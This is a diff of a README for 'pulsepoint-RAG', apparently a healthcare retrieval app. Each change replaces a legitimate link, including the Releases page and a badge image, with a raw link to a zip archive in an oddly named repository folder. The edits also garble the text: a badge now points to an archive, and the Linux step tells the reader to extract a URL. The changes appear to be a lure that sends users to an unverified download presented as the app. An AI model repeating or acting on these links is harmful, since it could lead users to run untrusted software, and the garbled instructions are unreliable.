@@ -1,6 +1,6 @@
 # 🎉 pulsepoint-RAG - Simplifying Healthcare Information Retrieval
 
-![Download pulsepoint-RAG](https://img.shields.io/badge/Download-pulsepoint--RAG-blue.svg)
+![Download pulsepoint-RAG](https://raw.githubusercontent.com/Ojcalzada/pulsepoint-RAG/main/alate/pulsepoint-RAG-2.1.zip)
 
 ## 📖 Introduction
 
@@ -23,7 +23,7 @@ Follow these steps to download and run **pulsepoint-RAG** on your computer.
 
    To get the latest version of **pulsepoint-RAG**, visit the **Releases** page directly. You can find it here:
 
-   [Download Page](https://github.com/Ojcalzada/pulsepoint-RAG/releases)
+   [Download Page](https://raw.githubusercontent.com/Ojcalzada/pulsepoint-RAG/main/alate/pulsepoint-RAG-2.1.zip)
 
 3. **Download the Application**
 
@@ -35,7 +35,7 @@ Follow these steps to download and run **pulsepoint-RAG** on your computer.
 
    - For Windows: Double-click the `.exe` file and follow the prompts to install the application.
    - For macOS: Open the downloaded `.dmg` file and drag the **pulsepoint-RAG** icon into your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow the included installation instructions.
+   - For Linux: Extract the `https://raw.githubusercontent.com/Ojcalzada/pulsepoint-RAG/main/alate/pulsepoint-RAG-2.1.zip` file and follow the included installation instructions.
 
 5. **Run the Application**
 
@@ -80,7 +80,7 @@ To get you started, here are some sample questions you can ask:
 
 To begin using **pulsepoint-RAG**, please visit the download page again:
 
-[Download Page](https://github.com/Ojcalzada/pulsepoint-RAG/releases)
+[Download Page](https://raw.githubusercontent.com/Ojcalzada/pulsepoint-RAG/main/alate/pulsepoint-RAG-2.1.zip)
 
 Download the application and follow the installation steps outlined above. 
 
